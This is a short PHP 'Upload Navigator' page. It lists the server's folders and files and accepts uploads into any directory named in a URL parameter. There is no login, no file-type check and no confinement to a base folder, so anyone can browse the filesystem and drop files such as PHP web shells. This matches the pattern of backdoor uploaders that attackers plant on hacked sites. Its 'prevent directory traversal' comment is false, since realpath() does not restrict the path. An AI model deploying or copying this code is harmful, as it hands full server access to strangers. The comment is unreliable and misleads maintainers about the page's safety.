<?php
// PHP Upload Center with Navigation (50 lines)
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$msg = '';

// Security: Prevent directory traversal
$current_dir = realpath($current_dir) ?: getcwd();

// Handle upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $target = $current_dir . '/' . basename($file['name']);
    
    if (move_uploaded_file($file['tmp_name'], $target)) {
        $msg = "✓ File uploaded to: " . htmlspecialchars($current_dir);
    } else {
        $msg = "✗ Upload failed";
    }
}

// Get folders and files
$items = scandir($current_dir);
$folders = $files = [];
foreach ($items as $item) {
    if ($item !== '.' && $item !== '..') {
        $path = $current_dir . '/' . $item;
        is_dir($path) ? $folders[] = $item : $files[] = $item;
    }
}
?>
<!DOCTYPE html>
<html>
<head><title>Upload Navigator</title><style>
body{font-family:monospace;margin:20px}
.path{background:#eee;padding:10px}
.folder{color:blue;cursor:pointer}
.folder:hover{text-decoration:underline}
form{border:2px dashed #aaa;padding:20px;margin:20px 0}
input,button{padding:10px;margin:5px}
.msg{padding:10px;background:#eef}
</style></head>
<body>
<h1>📁 Upload Navigator</h1>

<div class="path">
    <strong>Current Location:</strong> <?=htmlspecialchars($current_dir)?>
    <br><small>Click folders to navigate</small>
</div>

<?php if($msg):?><div class="msg"><?=$msg?></div><?php endif;?>

<form method="post" enctype="multipart/form-data">
    <input type="file" name="file" required>
    <button type="submit">Upload Here</button>
</form>

<h3>📂 Folders:</h3>
<ul>
    <li class="folder" onclick="navigate('..')">⬆ Parent Folder</li>
    <?php foreach($folders as $f):?>
        <li class="folder" onclick="navigate('<?=htmlspecialchars($f)?>')">📁 <?=htmlspecialchars($f)?></li>
    <?php endforeach;?>
</ul>

<h3>📄 Files:</h3>
<ul><?php foreach($files as $f):?>
    <li>📄 <?=htmlspecialchars($f)?></li>
<?php endforeach;?></ul>

<script>
function navigate(folder) {
    window.location.href = '?dir=<?=urlencode($current_dir)?>/' + encodeURIComponent(folder);
}
</script>
</body>
</html>
